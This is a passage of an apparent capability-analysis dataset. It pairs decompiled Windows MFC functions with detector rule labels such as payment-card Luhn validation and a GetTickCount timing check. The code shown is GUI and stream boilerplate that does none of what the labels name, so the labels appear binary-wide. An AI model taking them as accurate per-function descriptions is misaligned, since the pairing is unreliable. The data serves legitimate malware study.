        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.0040d274(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    char cVar1;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0;\n    if (*(unaff_EBP + 0x14) != 0) {\n        *extraout_ECX = 0x41ed6c;\n        extraout_ECX[10] = 0;\n        extraout_ECX[1] = vtable.std::basic_ios_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n        *(unaff_EBP + -0x10) = 1;\n        *(unaff_EBP + -4) = 0;\n    }\n    cVar1 = *(unaff_EBP + 0x10);\n    *(*(*extraout_ECX + 4) + extraout_ECX) =\n         vtable.std::basic_ostream_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n    if (cVar1 != '\\0') {\n        fcn.0040dac1(*(unaff_EBP + 8), *(unaff_EBP + 0xc));\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 397
    },
    "0040d392": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n\nint32_t * __cdecl fcn.0040d392(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x14) = extraout_ECX;\n    *(unaff_EBP + -0x10) = 0;\n    if (*(unaff_EBP + 0x10) != 0) {\n        *extraout_ECX = 0x41ed74;\n        extraout_ECX[0xb] = 0;\n        extraout_ECX[2] = vtable.std::basic_ios_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n        *(unaff_EBP + -0x10) = 1;\n        *(unaff_EBP + -4) = 0;\n    }\n    extraout_ECX[1] = 0;\n    uVar1 = *(unaff_EBP + 0xc);\n    uVar2 = *(unaff_EBP + 8);\n    *(*(*extraout_ECX + 4) + extraout_ECX) =\n         vtable.std::basic_istream_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n    fcn.0040dac1(uVar2, uVar1);\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return extraout_ECX;\n}\n",
        "token_count": 398
    },
    "0040d4b9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0040d4b9(code **param_1)\n\n{\n    uint *puVar1;\n    \n    *param_1 = vtable.std::basic_streambuf_unsigned_short_int__struct_std::char_traits_unsigned_short_int__.0;\n    if (param_1[0xd] != NULL) {\n        puVar1 = fcn.0040c324();\n        if (puVar1 != NULL) {\n            (***puVar1)(1);\n        }\n    }\n    return;\n}\n",
        "token_count": 110
    },
    "0040dd99": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.0040dd99(uint arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00412b9a(iVar2);\n    uVar1 = *(iVar2 + 0xc);\n    *(unaff_EBP + -4) = 0;\n    *(extraout_ECX + 3) = uVar1;\n    fcn.0040cad5(0);\n    fcn.0040dfe2(iVar2 + 0xc, 0, *0x41ed50);\n    uVar3 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::runtime_error.0;\n    *in_FS_OFFSET = uVar3;\n    return extraout_ECX;\n}\n",
        "token_count": 310
    },
    "0040e556": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_ch\n\ncode ** __cdecl fcn.0040e556(uint arg_8h)\n\n{\n    uchar uVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    iVar2 = *(unaff_EBP + 8);\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    fcn.00412b9a(iVar2);\n    uVar1 = *(iVar2 + 0xc);\n    *(unaff_EBP + -4) = 0;\n    *(extraout_ECX + 3) = uVar1;\n    fcn.0040cad5(0);\n    fcn.0040dfe2(iVar2 + 0xc, 0, *0x41ed50);\n    uVar3 = *(unaff_EBP + -0xc);\n    *extraout_ECX = vtable.std::logic_error.0;\n    *in_FS_OFFSET = uVar3;\n    return extraout_ECX;\n}\n",
        "token_count": 310
    },
    "0040ec00": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ec00(void)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = 0x431a24;\n    do {\n        fcn.0040ebe0(uVar1);\n        uVar1 = uVar1 + 4;\n    } while (uVar1 < 0x431a30);\n    fcn.0040ebe0(0x431a30);\n    return;\n}\n",
        "token_count": 96
    },
    "0040eda0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040eda0(uint param_1, int32_t *param_2, uint16_t param_3)\n\n{\n    uint32_t uVar1;\n    int32_t iStack16;\n    int32_t iStack12;\n    uint32_t uStack8;\n    uint32_t uStack4;\n    \n    iStack16 = *param_2;\n    iStack12 = param_2[1];\n    uStack8 = param_2[2];\n    uStack4 = param_2[3];\n    uVar1 = uStack8 & 0xffff0000;\n    fcn.0040ec60(param_1, &iStack16, 7, 1, uStack4 & 0xffff0000 | param_3 & 0xffff000f);\n    iStack16 = iStack16 + -1;\n    iStack12 = iStack12 + -1;\n    uStack8 = uStack8 + 1;\n    uStack4 = uStack4 + 1;\n    fcn.0040ec60(param_1, &iStack16, 2, 0, uVar1 | param_3);\n    return;\n}\n",
        "token_count": 255
    },
    "0040ee10": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ee10(uint param_1)\n\n{\n    uint unaff_retaddr;\n    uint *puVar1;\n    uint uStack16;\n    uint uStack12;\n    \n    puVar1 = &uStack16;\n    (*_sym.imp.USER32.dll_GetClientRect)(param_1, &uStack16);\n    (*_sym.imp.GDI32.dll_IntersectClipRect)(unaff_retaddr, param_1, puVar1, uStack16, uStack12);\n    return;\n}\n",
        "token_count": 111
    },
    "0040f180": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.0040f180(void)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    \n    iVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    iVar3 = 0;\n    if (0 < *0x431a3c) {\n        piVar2 = 0x431a44;\n        do {\n            if (*piVar2 == iVar1) {\n                return 1;\n            }\n            piVar2 = piVar2 + 5;\n            iVar3 = iVar3 + 1;\n        } while (iVar3 < *0x431a3c);\n    }\n    return 0;\n}\n",
        "token_count": 151
    },
    "00410160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00410160(uint param_1)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    \n    iVar1 = fcn.0040e930(param_1);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    if (0x35e < *0x431a00) {\n        uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1, 0xfffffff0);\n        if ((uVar2 & 4) != 0) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 135
    },
    "004106e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004106e0(uint param_1)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    uchar *puStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint uStack36;\n    uint uStack32;\n    \n    uStack32 = 0xfffffff0;\n    uStack36 = param_1;\n    puStack40 = 0x4106f3;\n    uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)();\n    puStack40 = &stack0xffffffe8;\n    uStack44 = param_1;\n    uStack48 = 0x410701;\n    (*_sym.imp.USER32.dll_GetWindowRect)();\n    puStack56 = &stack0xffffffe0;\n    uStack48 = 1;\n    uStack52 = 1;\n    uStack60 = 0x410710;\n    (*_sym.imp.USER32.dll_InflateRect)();\n    uStack60 = param_1;\n    puStack64 = 0x410717;\n    uVar3 = (*_sym.imp.USER32.dll_GetParent)();\n    pcVar1 = _sym.imp.USER32.dll_ScreenToClient;\n    puStack64 = &stack0xffffffd0;\n    (*_sym.imp.USER32.dll_ScreenToClient)(uVar3);\n    (*pcVar1)(uVar3, &stack0xffffffd0);\n    if ((uVar2 & 0x200000) != 0) {\n        puStack56 = puStack56 + 1;\n    }\n    (*_sym.imp.USER32.dll_ValidateRect)(uVar3, &stack0xffffffc0);\n    return;\n}\n",
        "token_count": 395
    },
    "00412232": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412232(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    \n    fcn.0041218e(arg_14h);\n    uVar1 = fcn.00412261(arg_8h, arg_ch, arg_10h, arg_14h);\n    fcn.004121e0(arg_14h);\n    return uVar1;\n}\n",
        "token_count": 102
    },
    "0041408f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0041408f(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint *puVar1;\n    \n    puVar1 = fcn.00415c9d(param_2 * param_3 + 4);\n    *puVar1 = *param_1;\n    *param_1 = puVar1;\n    return;\n}\n",
        "token_count": 87
    },
    "0041426c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.0041426c(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    int32_t in_ECX;\n    \n    iVar1 = arg_8h;\n    puVar2 = fcn.00414207(arg_8h, &arg_8h);\n    if (puVar2 == NULL) {\n        if (*(in_ECX + 4) == 0) {\n            fcn.00414108(*(in_ECX + 8), 1);\n        }\n        puVar2 = fcn.004141a1();\n        puVar2[1] = iVar1;\n        *puVar2 = *(*(in_ECX + 4) + arg_8h * 4);\n        *(*(in_ECX + 4) + arg_8h * 4) = puVar2;\n    }\n    return puVar2 + 2;\n}\n",
        "token_count": 204
    },
    "004146c2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __thiscall fcn.004146c2(int32_t param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t unaff_EBX;\n    int32_t arg_8h;\n    \n    if (param_2 < 1) {\n        iVar3 = *(param_1 + 0x1c);\n        if ((iVar3 != 0) && (*(iVar3 + 0x1c) != 0)) {\n            iVar1 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar3 + 0x1c));\n            if (iVar1 != 0) {\n                fcn.00415fbc(iVar3, *(iVar3 + 0x1c), 0x363, 1, 0);\n                fcn.00417713(*(iVar3 + 0x1c), 0x363, 1, 0, 1, 1);\n            }\n        }\n        fcn.0041ab50();\n        arg_8h = 0x41a47c;\n        iVar1 = fcn.0041b34f(0x41a47c);\n        for (iVar1 = *(iVar1 + 8); iVar1 != 0; iVar1 = *(iVar1 + 0x54)) {\n            if ((*(iVar1 + 0x1c) != 0) && (iVar1 != iVar3)) {\n                if (*(iVar1 + 0x88) == 0) {\n                    fcn.00418810(0, arg_8h);\n                }\n                iVar2 = (*_sym.imp.USER32.dll_IsWindowVisible)(*(iVar1 + 0x1c));\n                if ((iVar2 != 0) || (-1 < *(iVar1 + 0x88))) {\n                    fcn.00415fbc(iVar1, *(iVar1 + 0x1c), 0x363, 1, 0);\n                    arg_8h = *(iVar1 + 0x1c);\n                    fcn.00417713(arg_8h, 0x363, 1, 0, 1, 1);\n                }\n                iVar2 = *(iVar1 + 0x88);\n                if (0 < iVar2) {\n                    fcn.00418810();\n                    arg_8h = iVar2;\n                }\n                *(iVar1 + 0x88) = 0xffffffff;\n            }\n        }\n    }\n    else {\n        fcn.0041ab50();\n        iVar3 = fcn.0041b34f(0x41a47c);\n        if (*(iVar3 + 0x10) == 0) {\n            fcn.00418c07();\n            fcn.00418c10(1);\n        }\n    }\n    return unaff_EBX < 0;\n}\n",
        "token_count": 631
    },
    "00414b2c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00414b2c(void)\n\n{\n    int32_t iVar1;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    iVar1 = *(extraout_ECX + 0x10);\n    *(unaff_EBP + -4) = 0;\n    if (iVar1 != 0) {\n        (**(iVar1 + 0x1c))(extraout_ECX);\n    }\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 170
    },
    "00415181": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_40h\n// WARNING: Variable defined which should be unmapped: var_34h\n\nuint __cdecl\nfcn.00415181(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t *extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint lpTemplate;\n    uint var_ch_2;\n    uint hInstance;\n    uint var_10h;\n    uint var_40h;\n    uint var_34h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint hWnd;\n    uint hMem;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004077f4();\n    *(unaff_EBP + -0x10) = &stack0xffffffc0;\n    *(unaff_EBP + -0x24) = extraout_ECX;\n    if (*(unaff_EBP + 0x10) == 0) {\n        iVar2 = fcn.0041ab50();\n        *(unaff_EBP + 0x10) = *(iVar2 + 8);\n    }\n    iVar2 = fcn.0041ab50();\n    piVar1 = *(iVar2 + 0x1038);\n    *(unaff_EBP + -0x28) = piVar1;\n    *(unaff_EBP + -0x14) = 0;\n    *(unaff_EBP + -0x18) = 0;\n    *(unaff_EBP + -4) = 0;\n    fcn.004183c5(0x10);\n    fcn.004183c5(0x3c000);\n    if (piVar1 == NULL) {\ncode_r0x004151fe:\n        if (*(unaff_EBP + 8) != 0) {\n            *(unaff_EBP + -0x1c) = *0x42c8a8;\n            *(unaff_EBP + -4) = 1;\n            *(unaff_EBP + -0x20) = 0;\n            iVar2 = fcn.00419044(*(unaff_EBP + 8), unaff_EBP + -0x1c, unaff_EBP + -0x20);\n            if (iVar2 == 0) {\ncode_r0x00415289:\n                fcn.00418e93(*(unaff_EBP + 8));\n                *(unaff_EBP + -4) = 2;\n                fcn.004191cd(*(unaff_EBP + -0x20));\n                uVar3 = fcn.00418f30();\n                *(unaff_EBP + -0x14) = uVar3;\n                *(unaff_EBP + -4) = 1;\n                fcn.00418f22();\n                if (*(unaff_EBP + -0x14) != 0) {\n                    uVar3 = (*_sym.imp.KERNEL32.dll_GlobalLock)(*(unaff_EBP + -0x14));\n                    *(unaff_EBP + 8) = uVar3;\n                }\n            }\n            else {\n                iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0x2a);\n                if (iVar2 != 0) {\n                    iVar2 = fcn.00407abc(*(unaff_EBP + -0x1c), \"MS Shell Dlg\");\n                    if (iVar2 != 0) {\n                        iVar2 = fcn.00407abc(*(unaff_EBP + -0x1c), 0x41dc64);\n                        if (iVar2 != 0) {\n                            iVar2 = fcn.00407abc(*(unaff_EBP + -0x1c), \"Helv\");\n                            if (iVar2 != 0) goto code_r0x004152cb;\n                        }\n                    }\n                    if (*(unaff_EBP + -0x20) == 8) {\n                        *(unaff_EBP + -0x20) = 0;\n                    }\n                    goto code_r0x00415289;\n                }\n            }\ncode_r0x004152cb:\n            extraout_ECX[0xb] = -1;\n            extraout_ECX[9] = extraout_ECX[9] | 0x10;\n            fcn.0041662f(extraout_ECX);\n            if (*(unaff_EBP + 0xc) == 0) {\n                uVar3 = 0;\n            }\n            else {\n                uVar3 = *(*(unaff_EBP + 0xc) + 0x1c);\n            }\n            uVar3 = (*_sym.imp.USER32.dll_CreateDialogIndirectParamA)\n                              (*(unaff_EBP + 0x10), *(unaff_EBP + 8), uVar3, 0x414fc9, 0);\n            *(unaff_EBP + -0x18) = uVar3;\n            *(unaff_EBP + -4) = 0;\n            fcn.00415acc();\n            *(unaff_EBP + -4) = 0xffffffff;\n            if (piVar1 != NULL) {\n                (**(*piVar1 + 0x14))(unaff_EBP + -0x34);\n                if (*(unaff_EBP + -0x18) != 0) {\n                    (**(*extraout_ECX + 0xb4))(0);\n                }\n            }\n            iVar2 = fcn.0041667b();\n            if (iVar2 == 0) {\n                (**(*extraout_ECX + 0xa4))();\n            }\n            if ((*(unaff_EBP + -0x18) != 0) && ((*(extraout_ECX + 9) & 0x10) == 0)) {\n                (*_sym.imp.USER32.dll_DestroyWindow)(*(unaff_EBP + -0x18));\n                *(unaff_EBP + -0x18) = 0;\n            }\n            if (*(unaff_EBP + -0x14) != 0) {\n                (*_sym.imp.KERNEL32.dll_GlobalUnlock)(*(unaff_EBP + -0x14));\n                (*_sym.imp.KERNEL32.dll_GlobalFree)(*(unaff_EBP + -0x14));\n            }\n            if ((*(unaff_EBP + -0x18) != 0) || ((*(extraout_ECX + 9) & 0x10) == 0)) {\n                uVar3 = 1;\n                goto code_r0x0041539d;\n            }\n        }\n    }\n    else {\n        iVar2 = (**(*extraout_ECX + 0xb4))(unaff_EBP + -0x34);\n        if (iVar2 != 0) {\n            uVar3 = (**(*piVar1 + 0x10))(unaff_EBP + -0x34, *(unaff_EBP + 8));\n            *(unaff_EBP + 8) = uVar3;\n            goto code_r0x004151fe;\n        }\n    }\n    uVar3 = 0;\ncode_r0x0041539d:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar3;\n}\n",
        "token_count": 1713
    },
    "004153bb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.004153bb(code **param_1, code *param_2, code *param_3)\n\n{\n    fcn.00415ddf();\n    *param_1 = vtable.CDialog.0;\n    fcn.004079b0(param_1 + 0xf, 0, 0x20);\n    param_1[0x14] = param_3;\n    param_1[0xf] = param_2;\n    param_1[0x10] = param_2 & 0xffff;\n    return param_1;\n}\n",
        "token_count": 128
    },
    "00415957": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00415957(uint *param_1, int32_t param_2)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    if (param_2 == 0) {\n        *param_1 = *0x42c8a8;\n    }\n    else {\n        uVar2 = 0x40;\n        if ((((param_2 < 0x41) || (uVar2 = 0x80,  param_2 < 0x81)) || (uVar2 = 0x100,  param_2 < 0x101)) ||\n           (uVar2 = 0x200,  param_2 < 0x201)) {\n            puVar1 = fcn.00406f47();\n            puVar1[2] = uVar2;\n        }\n        else {\n            puVar1 = fcn.00415c9d(param_2 + 0xd);\n            puVar1[2] = param_2;\n        }\n        *puVar1 = 1;\n        *(puVar1 + param_2 + 0xc) = 0;\n        puVar1[1] = param_2;\n        *param_1 = puVar1 + 3;\n    }\n    return;\n}\n",
        "token_count": 280
    },
    "00415a21": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415a21(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 + -0xc != *0x42c8ac) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(*param_1 + -0xc);\n        if (iVar1 < 1) {\n            fcn.004159d9();\n        }\n        *param_1 = *0x42c8a8;\n    }\n    return;\n}\n",
        "token_count": 115
    },
    "00415acc": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00415acc(int32_t *param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*param_1 + -0xc != *0x42c8ac) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_InterlockedDecrement)(*param_1 + -0xc);\n        if (iVar1 < 1) {\n            fcn.004159d9();\n        }\n    }\n    return;\n}\n",
        "token_count": 99
    },
    "00415b48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.00415b48(int32_t *param_1, int32_t param_2)\n\n{\n    fcn.00415aa3(param_2);\n    fcn.00407b70(*param_1, param_2, param_2);\n    *(*param_1 + -8) = param_2;\n    *(*param_1 + param_2) = 0;\n    return;\n}\n",
        "token_count": 93
    },
    "00415ddf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.00415ddf(code **param_1)\n\n{\n    fcn.00414b12();\n    *param_1 = vtable.CWnd.0;\n    fcn.004079b0(param_1 + 7, 0, 0x20);\n    return param_1;\n}\n",
        "token_count": 70
    },
    "00415e1d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __thiscall fcn.00415e1d(code **param_1, code *param_2)\n\n{\n    fcn.00414b12();\n    *param_1 = vtable.CWnd.0;\n    fcn.004079b0(param_1 + 7, 0, 0x20);\n    param_1[7] = param_2;\n    return param_1;\n}\n",
        "token_count": 91
    },
    "004161a4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.004161a4(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.0041610b(0);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = fcn.00414239(unaff_retaddr);\n    }\n    return uVar2;\n}\n",
        "token_count": 90
    },
    "00417e7c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00417e7c(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint var_60h;\n    uint lprcSrc;\n    int32_t lpPoints;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t lprcDst;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = fcn.0041874c();\n    if (arg_8h == 0) {\n        if ((var_4h & 0x40000000) == 0) {\n            iVar5 = (*_sym.imp.USER32.dll_GetWindow)(*(in_ECX + 0x1c), 4);\n        }\n        else {\n            iVar5 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        }\n        if ((iVar5 != 0) && (iVar4 = (*_sym.imp.USER32.dll_SendMessageA)(iVar5, 0x36b, 0, 0),  iVar4 != 0)) {\n            iVar5 = iVar4;\n        }\n    }\n    else {\n        iVar5 = *(arg_8h + 0x1c);\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowRect;\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(in_ECX + 0x1c), &var_28h);\n    if ((var_4h & 0x40000000) == 0) {\n        if ((iVar5 != 0) &&\n           ((uVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(iVar5, 0xfffffff0),  (uVar2 & 0x10000000) == 0 ||\n            ((uVar2 & 0x20000000) != 0)))) {\n            iVar5 = 0;\n        }\n        if (iVar5 == 0) {\n            iVar5 = fcn.00406948();\n            if (iVar5 != 0) {\n                iVar5 = *(iVar5 + 0x1c);\n            }\n            uVar3 = fcn.00406a9a(iVar5, 1);\n            fcn.00406b05(uVar3, iVar5);\n            pcVar1 = _sym.imp.USER32.dll_CopyRect;\n            (*_sym.imp.USER32.dll_CopyRect)(&lpPoints, &lprcSrc);\n            (*pcVar1)(&lprcDst, &lprcSrc);\n        }\n        else {\n            (*pcVar1)(iVar5, &lpPoints);\n            uVar3 = fcn.00406a9a(iVar5, 2);\n            fcn.00406b05(uVar3, iVar5);\n            (*_sym.imp.USER32.dll_CopyRect)(&lprcDst, &lprcSrc);\n        }\n    }\n    else {\n        uVar3 = (*_sym.imp.USER32.dll_GetParent)(*(in_ECX + 0x1c));\n        pcVar1 = _sym.imp.USER32.dll_GetClientRect;\n        (*_sym.imp.USER32.dll_GetClientRect)(uVar3, &lprcDst);\n        (*pcVar1)(iVar5, &lpPoints);\n        (*_sym.imp.USER32.dll_MapWindowPoints)(iVar5, uVar3, &lpPoints, 2);\n    }\n    iVar5 = (lpPoints + var_30h) / 2 - (var_20h - var_28h) / 2;\n    iVar4 = (var_34h + var_2ch) / 2 - (var_1ch - var_24h) / 2;\n    if ((lprcDst <= iVar5) && (lprcDst = iVar5,  var_10h < (var_20h - var_28h) + iVar5)) {\n        lprcDst = (var_10h - var_20h) + var_28h;\n    }\n    if ((var_14h <= iVar4) && (var_14h = iVar4,  var_ch < (var_1ch - var_24h) + iVar4)) {\n        var_14h = (var_24h - var_1ch) + var_ch;\n    }\n    fcn.004187c1(0, lprcDst, var_14h, 0xffffffff, 0xffffffff, 0x15);\n    return;\n}\n",
        "token_count": 1086
    },
    "00418a09": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00418a09(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = fcn.00418982(0);\n    uVar2 = 0;\n    if (iVar1 != 0) {\n        uVar2 = fcn.00414239(unaff_retaddr);\n    }\n    return uVar2;\n}\n",
        "token_count": 89
    },
    "00418f36": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00418f36(int32_t param_1)\n\n{\n    int16_t *piVar1;\n    int16_t iVar2;\n    \n    if (*(param_1 + 2) == -1) {\n        piVar1 = param_1 + 0x1a;\n    }\n    else {\n        piVar1 = param_1 + 0x12;\n    }\n    iVar2 = *piVar1;\n    if (iVar2 == -1) {\n        piVar1 = piVar1 + 2;\n    }\n    else {\n        while (piVar1 = piVar1 + 1,  iVar2 != 0) {\n            iVar2 = *piVar1;\n        }\n    }\n    iVar2 = *piVar1;\n    if (iVar2 == -1) {\n        piVar1 = piVar1 + 2;\n    }\n    else {\n        while (piVar1 = piVar1 + 1,  iVar2 != 0) {\n            iVar2 = *piVar1;\n        }\n    }\n    do {\n        iVar2 = *piVar1;\n        piVar1 = piVar1 + 1;\n    } while (iVar2 != 0);\n    return;\n}\n",
        "token_count": 265
    },
    "0041a2b4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
